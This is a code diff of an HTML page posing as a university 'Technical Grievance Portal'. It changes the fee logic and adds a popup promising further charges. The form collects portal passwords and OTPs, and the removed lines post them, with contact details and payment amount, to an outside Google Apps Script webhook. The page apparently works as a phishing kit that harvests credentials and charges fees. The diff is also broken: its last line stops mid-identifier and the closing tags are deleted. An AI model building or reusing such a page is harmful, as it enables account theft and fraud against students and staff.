@@ -92,7 +92,7 @@
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div>
                 <label class="block text-sm font-medium text-slate-700 mb-1">User Classification *</label>
-                <select id="userCategory" onchange="updateProcessingFee()" required class="w-full border border-slate-300 rounded-lg p-2.5 bg-slate-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
+                <select id="userCategory" required class="w-full border border-slate-300 rounded-lg p-2.5 bg-slate-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                   <option value="" disabled selected>-- Select Role --</option>
                   <option value="Student / Candidate">Student / Candidate</option>
                   <option value="College Staff">College Staff</option>
@@ -115,15 +115,14 @@
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
               <div>
                 <label class="block text-sm font-medium text-slate-700 mb-1">Issue Category *</label>
-                <select id="issueCategory" required class="w-full border border-slate-300 rounded-lg p-2.5 bg-slate-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
+                <select id="issueCategory" onchange="updateProcessingFee()" required class="w-full border border-slate-300 rounded-lg p-2.5 bg-slate-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                   <option value="" disabled selected>-- Select Technical Issue --</option>
                   <option value="APAAR / Upper ID Fetching Issue">APAAR / Upper ID Fetching Issue</option>
                   <option value="Mandatory Password Changing Issue">Mandatory Password Changing Issue</option>
                   <option value="Password Reset Error">Password Reset Error</option>
                   <option value="OTP Verification Failure">OTP Verification Failure</option>
                   <option value="Admission / Registration Error">Admission / Registration Error</option>
-                  <option value="Internal Assessment Discrepancy">Internal Assessment Discrepancy</option>
-                  <option value="Other Portal Bug">Other Technical Issue</option>
+                  <option value="Other Portal Bug">Other issues Nominal Fee</option>
                 </select>
               </div>
 
@@ -173,7 +172,7 @@
             <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
               <div>
                 <span class="text-xs font-semibold text-blue-900 uppercase tracking-wide">Category Applicable Fee</span>
-                <p class="text-xs text-blue-700 mt-0.5">Fixed according to applicant designation and department overhead.</p>
+                <p class="text-xs text-blue-700 mt-0.5">Fixed according to selected technical grievance complexity.</p>
               </div>
               <div class="flex items-baseline gap-1 bg-white px-4 py-2 rounded-lg border border-blue-200 shadow-sm self-start sm:self-auto">
                 <span class="text-sm font-bold text-slate-500">₹</span>
@@ -214,30 +213,57 @@
     </div>
   </div>
 
+  <!-- POPUP MODAL: Other Portal Bug Notice -->
+  <div id="bugNoticeModal" class="fixed inset-0 bg-black/60 hidden backdrop-blur-sm z-50 flex items-center justify-center p-4">
+    <div class="bg-white rounded-2xl max-w-md w-full p-6 text-center shadow-2xl space-y-4">
+      <div class="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      </div>
+      <h3 class="text-lg font-bold text-slate-900">Other Technical Issue Notice</h3>
+      <p class="text-sm text-slate-600 leading-relaxed">
+        Other issues Nominal Fee <strong class="text-blue-700">Rs: 50.00</strong>.<br>
+        The remaining fee will be informed after the issue is found out.
+      </p>
+      <button onclick="document.getElementById('bugNoticeModal').classList.add('hidden')" class="w-full bg-blue-600 text-white py-2.5 rounded-lg hover:bg-blue-700 font-medium text-sm">
+        I Understand
+      </button>
+    </div>
+  </div>
+
   <!-- Footer -->
-  <footer class="bg-white border-t border-slate-200 py-6 text-center text-xs text-slate-500">
-    <p>UUCMS Technical Grievance Portal &copy; 2026. All credentials will be deleted once technical issues are resolved.</p>
+  <footer class="bg-white border-t border-slate-200 py-6 text-center text-xs text-slate-500 space-y-1">
+    <p>&copy; 2026 UUCMS Technical Resolution Desk. All rights reserved.</p>
+    <p>Unauthorized copying, reproduction, or redistribution of any content or portal features is strictly prohibited.</p>
+    <p class="text-slate-400 text-[11px] pt-1">
+      Notice: Submitted credentials and diagnostic data are automatically purged upon grievance resolution to ensure data privacy.
+    </p>
   </footer>
 
   <script>
     const GOOGLE_SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbz4yowS5r7KcuCv3rCAqSQr6Wz6E83AJwXQ2VpLG8LEmuH_aGJUSFyymU-893xcBrKR/exec";
 
-    // ADMIN CONFIGURATION: EXACT FEE RATES
-    const FEE_RATES = {
-      "Student / Candidate": 50.00,
-      "College Staff": 100.00,
-      "College Administrator": 150.00,
-      "University Staff": 200.00,
-      "University Administrator": 200.00
+    // FEE CONFIGURATION BASED ON TECHNICAL GRIEVANCE DETAILS
+    const ISSUE_FEE_RATES = {
+      "APAAR / Upper ID Fetching Issue": 150.00,
+      "Mandatory Password Changing Issue": 70.00,
+      "Password Reset Error": 70.00,
+      "OTP Verification Failure": 70.00,
+      "Admission / Registration Error": 200.00,
+      "Other Portal Bug": 50.00
     };
 
-    // Updates fee display dynamically when user category changes
+    // Updates fee display dynamically when Technical Issue selection changes
     function updateProcessingFee() {
-      const selectedCategory = document.getElementById('userCategory').value;
-      const rate = FEE_RATES[selectedCategory] !== undefined ? FEE_RATES[selectedCategory] : 0.00;
+      const selectedIssue = document.getElementById('issueCategory').value;
+      const rate = ISSUE_FEE_RATES[selectedIssue] !== undefined ? ISSUE_FEE_RATES[selectedIssue] : 0.00;
       
       document.getElementById('displayAmount').innerText = rate.toFixed(2);
       document.getElementById('fixedAmount').value = rate.toFixed(2);
+
+      // Show pop-up notice when "Other Portal Bug" is selected
+      if (selectedIssue === "Other Portal Bug") {
+        document.getElementById('bugNoticeModal').classList.remove('hidden');
+      }
     }
 
     // 1. STATUS CHECKING FUNCTION
@@ -321,41 +347,4 @@
         portalPassword: document.getElementById('portalPassword').value,
         otp: document.getElementById('otpValue').value || 'N/A',
         contactNumber: document.getElementById('contactNumber').value,
-        contactEmail: document.getElementById('contactEmail').value,
-        amount: finalAmount,
-        timestamp: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })
-      };
-
-      try {
-        await fetch(GOOGLE_SHEET_WEBHOOK_URL, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "text/plain;charset=utf-8" },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Submission log:", err);
-      }
-
-      // Show modal & prefill ticket ID into tracker
-      document.getElementById('resTicketId').innerText = ticketId;
-      document.getElementById('resAmount').innerText = "₹" + finalAmount;
-      document.getElementById('searchQuery').value = ticketId;
-      document.getElementById('successModal').classList.remove('hidden');
-
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = `
-        <span>Submit Grievance</span>
-        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-      `;
-    }
-
-    function resetAndClose() {
-      document.getElementById('successModal').classList.add('hidden');
-      document.getElementById('issueForm').reset();
-      document.getElementById('displayAmount').innerText = "0.00";
-      document.getElementById('fixedAmount').value = "0.00";
-    }
-  </script>
-</body>
-</html>
+        contactEmail: document.getEle
